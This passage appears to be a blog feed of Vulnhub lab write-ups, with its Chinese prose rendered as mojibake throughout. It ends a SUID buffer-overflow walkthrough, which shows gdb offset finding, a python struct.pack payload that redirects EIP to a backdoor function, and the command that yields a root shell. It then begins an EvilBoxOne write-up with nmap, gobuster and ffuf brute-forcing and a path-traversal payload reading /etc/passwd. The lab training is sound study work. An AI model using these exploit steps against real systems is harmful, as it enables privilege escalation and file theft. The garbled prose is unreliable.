<li>å¦‚æœä¸Šä¸ªé—®é¢˜ç­”æ¡ˆä¸º1ï¼Œåˆ™å¡«å†™Explainï¼›å¦åˆ™ç¨‹åºç»“æŸã€‚</li>
</ol>
<p>è¾“å…¥ä¸‹è¿°å‘½ä»¤å¼€å§‹åŠ¨æ€è°ƒè¯•ï¼š <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb -q ./add_record</span><br><span class="line"></span><br><span class="line">å†æ¬¡è¾“å…¥ræ‰å¯ä»¥æ‰§è¡Œè¯¥ç¨‹åºã€‚</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>å¦‚ä½•æ‰¾ç¼“å†²å»æ¼æ´å‘¢ï¼Ÿé¦–å…ˆå°±æ˜¯ç”Ÿæˆä¸€é•¿ä¸²çš„å­—ç¬¦Aï¼Œç„¶åæ‰¾åˆ°æ‰€æœ‰çš„æ•°æ®æäº¤ç‚¹ï¼Œæ¯æ¬¡æµ‹è¯•ä¸€ä¸ªæäº¤ç‚¹ã€‚æ¯”å¦‚ä¸Šè¿°æœ‰5ä¸ªæäº¤ç‚¹ï¼Œç¬¬ä¸€æ¬¡å°†ç”Ÿæˆçš„å­—ç¬¦ä¸²è¾“å…¥åˆ°Employee Nameï¼Œå…¶ä»–æäº¤ç‚¹æ­£å¸¸ä¼ å…¥æ•°æ®ï¼Œä»¥æ­¤ç±»æ¨ã€‚ è¿™æ ·å°±å¯ä»¥é€šè¿‡æŸ¥çœ‹å…¶ä»–å¯„å­˜å™¨æ˜¯å¦å……æ»¡å­—ç¬¦Aæ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨ç¼“å†²åŒºæ¼æ´ã€‚</p>
</blockquote>
<p>è¿™é‡Œåšä¸€ç»„å¯¹æ¯”ï¼Œç¬¬ä¸€ç»„æµ‹è¯•<code>Employee Name</code>ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405224330.png" /></p>
<p>ç›´æ¥é€€å‡ºç¨‹åºï¼Œè¯´æ˜è¯¥æäº¤ç‚¹å¹¶ä¸å­˜åœ¨ç¼“å†²åŒºæ¼æ´ã€‚</p>
<p>ç¬¬äºŒç»„æµ‹è¯•<code>Explain</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405224520.png" /></p>
<p>å¯ä»¥çœ‹åˆ°è®¸å¤šå¯„å­˜å™¨éƒ½æ˜¯Aï¼Œè¯æ˜è¯¥æäº¤ç‚¹å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´ã€‚<strong>æ³¨æ„å¯„å­˜å™¨<code>EIP</code>ï¼Œè¯¥å¯„å­˜å™¨å­˜æ”¾çš„æ˜¯CPUæ‰§è¡Œçš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„å­˜æ”¾åœ°å€</strong>ã€‚</p>
<p>æ¥ç€ï¼Œéœ€è¦åˆ¤æ–­EIPä¸­çš„4ä¸ªAæ˜¯æäº¤çš„å­—ç¬¦ä¸²ä¸­çš„å“ªå‡ ä¸ªï¼Œå¯ä»¥å…ˆä¸æ–­å‡å°‘å­—ç¬¦Açš„ä¸ªæ•°ï¼Œç„¶åæäº¤ï¼Œç›´åˆ°æ‰¾åˆ°ã€‚ä¹Ÿå¯ä»¥ç”Ÿæˆç‰¹å¾å­—ç¬¦ä¸²ï¼ˆæ¯4ä¸ªä¸ºä¸€ä¸ªå­ä¸²ï¼Œåœ¨æ•´ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚å­ä¸²æ˜¯å”¯ä¸€çš„ï¼‰ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pattern create [len] # é•¿åº¦è‡³å°‘è¦ä¿è¯EIPä¸­å……æ»¡A</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405225135.png" /></p>
<p>ç„¶ååˆ©ç”¨å‘½ä»¤è‡ªåŠ¨æŸ¥æ‰¾ä½ç½®ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pattern search</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405225310.png" /></p>
<p>EIPçš„ç¬¬ä¸€ä¸ªå­—ç¬¦åœ¨ç‰¹å¾å­—ç¬¦ä¸²çš„ä½ç½®æ˜¯62ï¼ˆä½ç½®ä»0å¼€å§‹ï¼‰ï¼Œå› æ­¤ï¼ŒEIPåœ¨å­—ç¬¦ä¸²ä¸­çš„ä½ç½®å°±æ˜¯62ï¼Œ63ï¼Œ64ï¼Œ65å››ä¸ªä½ç½®ã€‚å¯ä»¥éªŒè¯ä¸€ä¸‹ï¼Œç”Ÿæˆå¦‚ä¸‹å­—ç¬¦ä¸²ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405225456.png" /></p>
<p>ç„¶åå¸¦å…¥è¿›å»ï¼Œå¦‚æœæ­¤æ—¶EIPå†…æ˜¯BCDEï¼Œåˆ™ä»£è¡¨ä½ç½®æ­£ç¡®ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405225548.png" /></p>
<p>ä½ç½®æ­£ç¡®</p>
<h3 id="æŸ¥çœ‹æ±‡ç¼–ä»£ç ">æŸ¥çœ‹æ±‡ç¼–ä»£ç </h3>
<h4 id="è¯¥ç¨‹åºçš„æ±‡ç¼–ä»£ç ">è¯¥ç¨‹åºçš„æ±‡ç¼–ä»£ç </h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">disas main</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405230105.png" /></p>
<p>å°–æ‹¬å·é‡Œé¢æ˜¯å‡½æ•°ï¼Œå¸¦<code>@plt</code>çš„æ˜¯è‡ªå¸¦çš„å‡½æ•°ï¼Œä¸å¸¦çš„åˆ™æ˜¯è‡ªå·±ç¼–å†™çš„å‡½æ•°ã€‚<code>call</code>ä»£è¡¨è°ƒç”¨ã€‚æœ€å‰é¢çš„16è¿›åˆ¶æ•°å­—è¡¨ç¤ºè¯¥æŒ‡ä»¤å­˜æ”¾çš„å†…å­˜åœ°å€ã€‚</p>
<p>å¯ä»¥é€šè¿‡æ‰“æ–­ç‚¹è°ƒè¯•ï¼Œæµ‹è¯•å‡½æ•°çš„åŠŸèƒ½ï¼ˆä»¥<code>0x080487ea</code>ä¸ºä¾‹ï¼Œæ–­ç‚¹è¦æ‰“åœ¨è¿™å¥è¯çš„å‰ä¸€ä¸ªä½ç½®ï¼‰ã€‚ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">break *0x080487e7</span><br><span class="line">r</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405230637.png" /></p>
<p>å½“è¾“å…¥1ä¹‹åç¨‹åºåœæ­¢äº†ï¼Œè¾“å…¥<code>s</code>å•æ­¥è¿è¡Œï¼Œç„¶åæ­£å¥½åˆ°æˆ‘ä»¬è¦æµ‹è¯•çš„å‡½æ•°<code>getchar@plt</code>ï¼Œè¯´æ˜è¿™é‡Œçš„ä½œç”¨å°±æ˜¯è·å¾—æˆ‘ä»¬çš„è¾“å…¥ã€‚</p>
<p>æ³¨æ„åˆ°è¿™é‡Œæœ‰ä¸€ä¸ª<code>vuln</code>çš„å‡½æ•°ã€‚å¯ä»¥åˆ©ç”¨<code>info func</code>æŸ¥çœ‹è¯¥ç¨‹åºçš„æ‰€æœ‰å‡½æ•°ï¼Œå‘ç°é‡Œé¢æœ‰<code>system@plt, setuid@plt, vuln, backdoor</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405231236.png" /></p>
<h4 id="vulnå‡½æ•°çš„æ±‡ç¼–ä»£ç ">vulnå‡½æ•°çš„æ±‡ç¼–ä»£ç </h4>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405231350.png" /></p>
<p>æ³¨æ„<code>strcpy@plt</code>ï¼Œè¿™ä¸ªå‡½æ•°å­˜åœ¨ç€æ¼æ´ã€‚<a href="https://stackoverflow.com/questions/48356481/exploiting-strcpy-in-c-with-buffer-overflow">strcpyç¼“å†²åŒºæº¢å‡ºæ¼æ´</a></p>
<p>å› æ­¤ï¼Œä¹‹å‰æµ‹è¯•çš„ç¼“å†²åŒºæº¢å‡ºæ¼æ´å‡ºç°çš„åŸå› å°±æ˜¯ä¸»å‡½æ•°è°ƒç”¨<code>vuln</code>ï¼Œç„¶å<code>vuln</code>åˆè°ƒç”¨äº†è¯¥å‡½æ•°é€ æˆçš„ã€‚</p>
<h4 id="backdoorå‡½æ•°çš„æ±‡ç¼–ä»£ç ">backdoorå‡½æ•°çš„æ±‡ç¼–ä»£ç </h4>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405231651.png" /></p>
<p>æ³¨æ„åˆ°è¿™é‡Œå…ˆè¿è¡Œäº†<code>setuid</code>ï¼Œç„¶åè¿è¡Œäº†<code>system</code>ï¼Œä¹Ÿå°±æ˜¯æ­¤æ—¶çš„<code>system</code>å¯èƒ½æ˜¯ä»¥rootæƒé™è¿è¡Œçš„ã€‚é‚£ä¹ˆæ­¤æ—¶å°±éœ€è¦çŸ¥é“<code>system</code>æ‰§è¡Œäº†ä»€ä¹ˆå‘½ä»¤ã€‚</p>
<p><strong>å¤åˆ¶<code>backdoor</code>ç¬¬ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ã€‚ç„¶ååˆ©ç”¨ç¼“å†²åŒºæº¢å‡ºçš„æ¼æ´ï¼Œå°†è¯¥åœ°å€æ”¾åˆ°EIPä¸­ï¼Œè¿™æ ·ï¼Œéšç€ç¨‹åºçš„æ‰§è¡Œï¼Œå°±ä¼šå°†<code>backdoor</code>å‡½æ•°è°ƒç”¨</strong>ã€‚</p>
<blockquote>
<p>å¯ä»¥ç”Ÿæˆä¸€ä¸ªæ–‡ä»¶ï¼ŒæŠŠæ¯ä¸€ä¸ªé—®é¢˜çš„å›ç­”éƒ½å†™å…¥ï¼Œå›ç­”ä¹‹é—´ç”¨æ¢è¡Œç¬¦åˆ†å‰²ï¼Œç„¶å r &lt; filenameï¼Œè‡ªåŠ¨åŒ–æ‰§è¡Œã€‚</p>
</blockquote>
<p>ç¬¬ä¸€æ­¥ï¼Œç”Ÿæˆä¸€ä¸ªæ–‡ä»¶ <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import struct; print(&#x27;h\n1\n1\n1\n&#x27; + &#x27;A&#x27;*62 + struct.pack(&#x27;I&#x27;, 0x08048676))&quot;</span> &gt; payload</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406103054.png" /></p>
<p>ï¼ˆè§‚å¯Ÿå‰é¢æ³¨å…¥BCDEçš„æ—¶å€™ï¼ŒEIPå†…å®¹æ˜¯BCDEï¼Œä½†æ˜¯16è¿›åˆ¶æ˜¯0x45444342ï¼Œå¯ä»¥çœ‹åˆ°é¡ºåºè¢«é¢ å€’äº†ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬å†™å…¥backdoorå‡½æ•°çš„ç¬¬ä¸€æ¡æŒ‡ä»¤çš„åœ°å€çš„æ—¶å€™ä¹Ÿéœ€è¦é¢ å€’ä»¥ä¸‹å†™è¿›å»ï¼Œæ‰€ä»¥ä½¿ç”¨<code>struct.pack</code>ï¼‰</p>
<p>ç¬¬äºŒæ­¥ï¼Œæ‰§è¡Œå‘½ä»¤ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">r &lt; payload</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406103200.png" /></p>
<p>æ³¨æ„ä¸‹å‡ å¥è¯ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[New process 4825]</span><br><span class="line">process 4825 is executing new program: /bin/dash</span><br><span class="line">[New process 4826]</span><br><span class="line">process 4826 is executing new program: /bin/bash</span><br></pre></td></tr></table></figure></p>
<p>å½“æˆ‘ä»¬å¾€<code>EIP</code>å†™å…¥<code>backdoor</code>æŒ‡ä»¤åï¼Œè¯¥ç¨‹åºå°±ä¼šè‡ªåŠ¨è°ƒç”¨<code>backdoor</code>å‡½æ•°ï¼Œç»“æœå¦‚ä¸Šã€‚å¦‚æœæ²¡æœ‰è°ƒç”¨è¯¥å‡½æ•°ï¼Œé‚£ä¹ˆå°±ä¸ä¼šå‡ºç°ä¸Šè¿°ç»“æœã€‚å› æ­¤ï¼Œ<code>backdoor</code>å‡½æ•°æ‰§è¡Œäº†<code>/bin/bash</code>å’Œ<code>/bin/dash</code>ï¼Œå¹¶ä¸”åœ¨è¯¥ç¨‹åºæ‰§è¡Œå®Œæ¯•ä¹‹åé€€å‡ºã€‚</p>
<p>å› æ­¤ï¼Œæˆ‘ä»¬åªéœ€è¦æ­£å¸¸çš„æ‰§è¡Œç¨‹åºï¼Œç„¶ååœ¨Explainå¤„å°†<code>backdoor</code>å‡½æ•°çš„ç¬¬ä¸€æ¡æŒ‡ä»¤å†™å…¥åˆ°<code>EIP</code>å¯„å­˜å™¨å³å¯è·å¾—rootæƒé™ã€‚</p>
<p>ç¬¬ä¸‰æ­¥ï¼ŒåŠ¨æ€è°ƒè¯•éªŒè¯ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">break vuln </span><br></pre></td></tr></table></figure></p>
<p>å•æ­¥æ‰§è¡Œåˆ°<code>backdoor</code>å‡½æ•°ä¹‹åå°±éœ€è¦æ…¢ç‚¹æ“ä½œäº†ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406104348.png" /></p>
<p>å•æ­¥æ‰§è¡Œåˆ°<code>setuid</code>å‡½æ•°ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406104448.png" /></p>
<p>è¯¥å‡½æ•°æ‰§è¡Œå®Œæ¯•ä¹‹åå–å¾—suidæƒé™ã€‚ç„¶åæ³¨æ„å•æ­¥æ‰§è¡Œåˆ°ä¸‹å›¾ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406105131.png" /></p>
<p>å°†<code>/bin/bash</code>å†™å…¥åˆ°EAXå¯„å­˜å™¨ï¼Œç„¶åè°ƒç”¨<code>system</code>å‡½æ•°å»æ‰§è¡ŒEAXä¸­çš„æŒ‡ä»¤ï¼Œè¿™æ ·å¾—åˆ°çš„ç»“æœå°±æ˜¯rootæƒé™çš„shellã€‚</p>
<h3 id="æ¼æ´åˆ©ç”¨">æ¼æ´åˆ©ç”¨</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat payload - | ./add_record</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406105554.png" /></p>
<p>ï¼ˆç®¡é“ç¬¦å‰é¢çš„å‡å·çš„æ„æ€æ˜¯å°†payloadä¸­çš„å†…å®¹ä½œä¸ºæ ‡å‡†è¾“å…¥è¾“å‡ºã€‚ï¼‰</p>
<p>æˆåŠŸè·å¾—rootæƒé™ï¼Œè¿™å°é¶æœºåˆ°æ­¤å°±å…¨éƒ¨ç»“æŸäº†ã€‚</p>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>è¿™å°é¶æœºéš¾åº¦å¾ˆå¤§ï¼Œæ¶‰åŠåˆ°äº†<strong>ç¼“å†²åŒºæº¢å‡ºæ¼æ´</strong>ï¼Œè¿™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡è§è¯†åˆ°è¿™ç§æ¼æ´ï¼Œå› æ­¤å¯èƒ½å­˜åœ¨ç€é”™è¯¯ã€‚</p>
<p>Linuxææƒä¸­ä¼˜å…ˆè€ƒè™‘ï¼šå†…æ ¸æ¼æ´ã€SUIDã€SUDOé…ç½®ã€‚ä½†æ˜¯è¿™å°é¶æœºå°†SUIDå’Œç¼“å†²åŒºæº¢å‡ºæ¼æ´ç»“åˆåœ¨ä¸€èµ·ã€‚è¿™ä¸ºææƒå¸¦æ¥äº†ä¸€ç§æ€è·¯ï¼</p>
<p>å¦‚æœhttpæœåŠ¡å­˜åœ¨ç€æ³¨å†ŒåŠŸèƒ½ç‚¹ï¼Œä¸€å®šè¦å°è¯•ä¸€ä¸‹ï¼Œçœ‹ä¸€äº›ç™»é™†è¿›å»çš„ç•Œé¢æ˜¯å¦å­˜åœ¨ç€æ¼æ´ï¼ä½†æ˜¯ï¼Œåƒä¸‡åˆ«å†™çœŸå®çš„ä¸ªäººä¿¡æ¯ã€‚</p>
<p>é‡åˆ°æ–°çš„æŠ€æœ¯â€”â€”XMLRPCï¼Œéœ€è¦å¿«é€Ÿçš„æŒæ¡å…¶å·¥ä½œåŸç†ã€‚</p>
]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>ç»¼åˆ</tag>
        <tag>vulnhub</tag>
        <tag>ç¼“å†²åŒºæº¢å‡ºæ¼æ´</tag>
        <tag>XMLRPCå‘½ä»¤æ‰§è¡Œ</tag>
        <tag>åŠ¨æ€è°ƒè¯•</tag>
      </tags>
  </entry>
  <entry>
    <title>6 Vulnhub EvilBoxOne Writeup</title>
    <url>/2022/04/07/6%20Vulnhub%20EvilBoxOne%20Writeup/</url>
    <content><![CDATA[<p>è¯¥é¶æœºéš¾åº¦ä»‹äºç®€å•å’Œä¸­ç­‰ä¹‹é—´ã€‚ä¸è¿‡è¿˜æ˜¯èƒ½å¤Ÿå­¦åˆ°å¾ˆå¤šçŸ¥è¯†ã€‚</p>
<span id="more"></span>
<h1 id="é¶æœºä¿¡æ¯">é¶æœºä¿¡æ¯</h1>
<p>é¶æœºåœ°å€ï¼š<a href="https://www.vulnhub.com/entry/evilbox-one,736/">evilbox_one</a></p>
<p>éš¾åº¦ï¼šEasy/Medium (Intermediate)</p>
<p>ç›®æ ‡ï¼šå–å¾—rootæƒé™ + 2 Flag</p>
<p>æ¶‰åŠæ”»å‡»æ–¹æ³•ï¼š</p>
<ul>
<li>ä¸»æœºå‘ç°</li>
<li>ç«¯å£æ‰«æ</li>
<li>å¼ºåˆ¶è®¿é—®ï¼ˆè·¯å¾„çˆ†ç ´ï¼‰</li>
<li><strong>å‚æ•°çˆ†ç ´</strong></li>
<li>æ–‡ä»¶åŒ…å«</li>
<li>PHPå°è£…å™¨ï¼ˆä¼ªåè®®ï¼‰</li>
<li>ä»»æ„æ–‡ä»¶è¯»å–</li>
<li><strong>SSHå…¬é’¥ç™»å½•</strong></li>
<li><strong>ç¦»çº¿å¯†ç ç ´è§£</strong></li>
<li>ç³»ç»Ÿæƒé™æ¼æ´åˆ©ç”¨</li>
</ul>
<h1 id="æ¸—é€">æ¸—é€</h1>
<p>æ”»å‡»æœºkaliï¼š10.0.2.4</p>
<h2 id="ä¸»æœºå‘ç°">ä¸»æœºå‘ç°</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fping -gaq 10.0.2.0/24</span><br><span class="line"></span><br><span class="line">-a: æ˜¾ç¤ºå¯pingé€šçš„ç›®æ ‡</span><br><span class="line">-g: ç”Ÿæˆç›®æ ‡åˆ—è¡¨(ä¸èƒ½ä¸ -f åŒæ—¶ä½¿ç”¨)ï¼Œå¯æŒ‡å®šç›®æ ‡çš„å¼€å§‹å’Œç»“æŸIPï¼Œ æˆ–è€…æä¾›ipçš„å­ç½‘æ©ç </span><br><span class="line">-q: å®‰é™æ¨¡å¼(ä¸æ˜¾ç¤ºæ¯ä¸ªç›®æ ‡æˆ–æ¯ä¸ªpingçš„ç»“æœ)</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406214147.png" /></p>
<p>é¶æœºçš„IPä¸ºï¼š10.0.2.9</p>
<h2 id="ç«¯å£æ‰«æ">ç«¯å£æ‰«æ</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.9</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406214333.png" /></p>
<p>é¶æœºæ‰“å¼€äº†ä¸¤ä¸ªç«¯å£ï¼š22å’Œ80</p>
<h2 id="ç«¯å£æœåŠ¡å‘ç°">ç«¯å£æœåŠ¡å‘ç°</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80 -A 10.0.2.9</span><br><span class="line"></span><br><span class="line">-A ç­‰ä»·äº -sV -sC -O çš„ç»„åˆ</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406214416.png" /></p>
<ul>
<li>22ç«¯å£çš„æœåŠ¡ä¸ºsshï¼Œè¿™é‡Œå…¶å®å¯ä»¥å°è¯•çˆ†ç ´</li>
<li>80ç«¯å£çš„æœåŠ¡ä¸ºhttpï¼ŒCMSæ˜¯Apache2ï¼Œç‰ˆæœ¬ä¸º2.4.38</li>
<li>é¶æœºæ“ä½œç³»ç»Ÿä¸ºDebian</li>
<li>ç³»ç»Ÿå†…æ ¸ç‰ˆæœ¬ä¸º 4.xæˆ–è€…5.xï¼Œè¯¥å·¥å…·çŒœæµ‹ä¸º4.15-5.6</li>
<li>å…¶ä»–ä¿¡æ¯</li>
</ul>
<h2 id="è®¿é—®httpæœåŠ¡">è®¿é—®httpæœåŠ¡</h2>
<p>è®¿é—®<code>10.0.2.9:80</code>å‘ç°æ˜¯apache2çš„ä¸€ä¸ªç•Œé¢ï¼Œæ²¡æœ‰å…¶ä»–ä¿¡æ¯äº†ã€‚æ­¤æ—¶çœ‹ä¸€ä¸‹æºç å’ŒæŠ“åŒ…ï¼Œå‘ç°éƒ½æ²¡æœ‰ä¿¡æ¯ï¼Œå› æ­¤ç›´æ¥è¿›è¡Œè·¯å¾„çˆ†ç ´ã€‚ <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://10.0.2.9 -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp,asp</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406220602.png" /></p>
<p>å‘ç°äº†ä¸€ä¸ªæ–°çš„ç›®å½•<code>/secret</code>ï¼Œç›´æ¥è®¿é—®å‘ç°ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼ŒåŒ…æ‹¬æºç ä¹Ÿæ˜¯ä»€ä¹ˆéƒ½æ²¡æœ‰ã€‚æ­¤æ—¶é’ˆå¯¹è¿™ä¸ªåˆšå‘ç°çš„ç›®å½•å†æ¬¡è¿›è¡Œè·¯å¾„çˆ†ç ´ã€‚ <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://10.0.2.9/secret -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp,asp</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406220925.png" /></p>
<p>å‘ç°äº†åœ¨è¯¥ç›®å½•ä¸‹è¿˜å­˜åœ¨ç€ä¸¤ä¸ªæ–‡ä»¶ã€‚æŠŠæ¯ä¸€ä¸ªéƒ½è®¿é—®ä¸€ä¸‹ã€‚å‘ç°ä¸¤ä¸ªæ–‡ä»¶çš„å†…å®¹éƒ½ä¸ºç©ºã€‚æ­¤æ—¶ï¼Œæœ‰å¯èƒ½æ˜¯è¯¥ç½‘é¡µåªæœ‰ä¼ å…¥å‚æ•°æ‰èƒ½å¤Ÿæ˜¾ç¤ºä¸€äº›å†…å®¹ï¼Œä½†æ˜¯æˆ‘ä»¬å¹¶ä¸çŸ¥é“æœ‰å“ªäº›å‚æ•°ï¼Œå¹¶ä¸”å‚æ•°çš„å€¼åº”è¯¥ä¸ºä»€ä¹ˆä¹Ÿä¸çŸ¥é“ã€‚è¿™æ—¶å€™å°±å¯ä»¥åˆ©ç”¨<strong>å‚æ•°çˆ†ç ´</strong>ã€‚</p>
<h2 id="å‚æ•°çˆ†ç ´">å‚æ•°çˆ†ç ´</h2>
<p>å‚æ•°çˆ†ç ´æ—¶ï¼Œå‚æ•°å€¼ä¸€èˆ¬æœ‰ä¸¤ç§æƒ…å†µï¼š</p>
<ol type="1">
<li>æ•°å­—ã€å­—æ¯è¿™äº›å¸¸è§çš„å€¼ä»¥åŠå®¹æ˜“å¼•èµ·SQLæ³¨å…¥çš„å­—ç¬¦ï¼ˆå¦‚å•å¼•å·ï¼‰ç­‰ï¼›</li>
<li>ç½‘é¡µä¸Šå¯èƒ½å­˜åœ¨æ–‡ä»¶åŒ…å«ï¼ˆå¦‚æœæ²¡æœ‰ä¼ å…¥æ–‡ä»¶åï¼Œå¾ˆæœ‰å¯èƒ½å†…å®¹ä¸ºç©ºï¼‰ï¼Œæ­¤æ—¶å°±éœ€è¦å°†ç½‘ç«™å·²ç»å­˜åœ¨çš„æ–‡ä»¶åä½œä¸ºå‚æ•°å€¼</li>
</ol>
<p>å…ˆå°è¯•ç¬¬ä¸€ç§æƒ…å†µï¼š <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffuf -w [å‚æ•°å­—å…¸]:PARAM -w [å‚æ•°å€¼å­—å…¸]:VAL -u http://10.0.2.9/secret/evil.php?PARAM=VAL -fs 0</span><br><span class="line"></span><br><span class="line">-fs è¿‡æ»¤ã€‚ -fs 0 è¡¨ç¤ºå¦‚æœé¡µé¢è¿”å›çš„å†…å®¹ä¸ºç©ºåˆ™è¿‡æ»¤ï¼ˆä¸æ˜¾ç¤ºï¼‰</span><br></pre></td></tr></table></figure></p>
<p>å‘ç°æ²¡æœ‰ä»»ä½•ç»“æœã€‚é‚£ä¹ˆæ¥ä¸‹æ¥å°è¯•ç¬¬äºŒç§æƒ…å†µï¼š <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://10.0.2.9/secret/evil.php?FUZZ=../index.html -fs 0</span><br><span class="line"></span><br><span class="line">å¦‚æœåªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œå¯ä»¥ç”¨ä¸Šé¢ï¼ŒFUZZä¼šè‡ªåŠ¨ä½¿ç”¨å­—å…¸æ¥ä»£æ›¿</span><br></pre></td></tr></table></figure></p>
<p>ï¼ˆè¿™é‡Œå› ä¸º<code>secret</code>ç›®å½•ä¸‹çš„<code>index.html</code>å†…å®¹ä¸ºç©ºï¼Œæ‰€ä»¥ä½¿ç”¨ç½‘ç«™ç›®å½•ä¸‹çš„<code>index.html</code>ï¼‰</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406221820.png" /></p>
<p>æ­¤æ—¶çˆ†å‡ºä¸€ä¸ªå‚æ•°å commandã€‚æˆ‘ä»¬ç”¨æµè§ˆå™¨éªŒè¯ä¸€ä¸‹ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406221946.png" /></p>
<p>å‘ç°ç¡®å®å­˜åœ¨ï¼Œè¿™åƒæ˜¯<strong>æ–‡ä»¶åŒ…å«æ¼æ´</strong>ï¼Œå¦‚æœæˆ‘ä»¬åŒ…å«<code>evil.php</code>å‘ç°ç»“æœå’Œç›´æ¥è®¿é—®æ˜¯ä¸€æ ·çš„ã€‚è¾“å…¥å¦‚ä¸‹payloadéªŒè¯ä¸€ä¸‹æ˜¯å¦å­˜åœ¨è¯¥æ¼æ´ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.9/secret/evil.php?command=../../../../../etc/passwd</span><br></pre></td></tr></table></figure></p>
<p>ï¼ˆLinuxä¸­ <code>cd ..</code> æ˜¯è¿”å›ä¸Šä¸€çº§ç›®å½•ï¼Œå¦‚æœ<code>cd ../../../../../</code>è¿”å›äº”æ¬¡ä¸Šçº§ç›®å½•ï¼Œå¦‚æœä¸å¤Ÿ5æ¬¡ï¼Œé‚£å°±è¿”å›åˆ°æ ¹ç›®å½•åˆ™åœæ­¢ã€‚ï¼‰</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406224234.png" /></p>
<p>å‘ç°ç¡®å®å­˜åœ¨<strong>æ–‡ä»¶åŒ…å«æ¼æ´</strong>ã€‚</p>
<h2 id="æ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨">æ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨</h2>
<p>æ–‡ä»¶åŒ…å«æ¼æ´çš„åˆ©ç”¨ä¸€èˆ¬æœ‰ä»¥ä¸‹å‡ ç§ï¼š</p>
<ol type="1">
<li>å¦‚æœå­˜åœ¨<strong>è¿œç¨‹æ–‡ä»¶åŒ…å«</strong>ï¼Œåˆ™å¯ä»¥åœ¨è‡ªå·±çš„ä¸»æœºå†™ä¸€å¥è¯ï¼Œç„¶åè®©é¶æœºåŒ…å«è¯¥æ–‡ä»¶ï¼›</li>
<li>å¦‚æœä¸å­˜åœ¨<strong>è¿œç¨‹æ–‡ä»¶åŒ…å«</strong>ï¼Œåˆ©ç”¨ä¼ªåè®®å¾€é¶æœºå†™å…¥ä¸€å¥è¯ï¼›</li>
